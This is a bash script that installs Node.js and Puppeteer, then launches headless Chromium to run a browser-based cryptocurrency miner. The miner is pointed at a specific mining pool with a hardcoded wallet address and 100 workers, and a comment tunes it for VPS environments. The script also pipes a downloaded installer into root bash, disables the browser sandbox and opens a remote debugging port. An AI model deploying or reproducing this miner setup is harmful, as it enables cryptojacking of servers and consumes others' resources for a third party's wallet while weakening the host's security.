#!/bin/bash

# Exit script on any command failure
set -e

# Update and install necessary packages
echo "Updating system and installing necessary packages..."
sudo apt update
sudo apt install -y curl libnss3 libatk-bridge2.0-0 libatk1.0-0 libcups2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libxshmfence1 libxft2 libx11-xcb1 libgbm1 libasound2 libpango-1.0-0 libpangocairo-1.0-0 libxfixes3

# Install Node.js if not already installed
if ! command -v node &> /dev/null; then
    echo "Node.js not found, installing..."
    curl -fsSL https://deb.nodesource.com/setup_current.x | sudo -E bash -
    sudo apt install -y nodejs
fi

# Ensure npm is up to date
sudo npm install -g npm

# Create a package.json file if it doesn't exist
if [ ! -f "package.json" ]; then
    echo "Creating package.json..."
    npm init -y
fi

# Install Puppeteer if not already installed
if ! npm ls puppeteer &> /dev/null; then
    echo "Installing Puppeteer..."
    npm install puppeteer
fi

# Create or overwrite the Node.js script file
echo "Creating script.js..."
cat << 'EOF' > script.js
const puppeteer = require('puppeteer');

(async () => {
  try {
    const browser = await puppeteer.launch({
      headless: true, // Ensure headless mode is enabled
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--disable-dev-shm-usage', // For VPS environments
        '--remote-debugging-port=9222' // Optional: for debugging
      ]
    });
    const page = await browser.newPage();

    // Open the specified URL
    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=100');

    // Wait indefinitely or until you decide to close it manually
    console.log('Browser is open and running...');

    // Uncomment the following line if you want to close the browser programmatically after a certain time
    // await new Promise(resolve => setTimeout(resolve, 3600000)); // Keeps the browser open for 1 hour

    // Uncomment this line if you want to close the browser manually later
    // await browser.close();
  } catch (error) {
    console.error('Error:', error);
  }
})();
EOF

# Run the Node.js script
echo "Running the Puppeteer script..."
node script.js
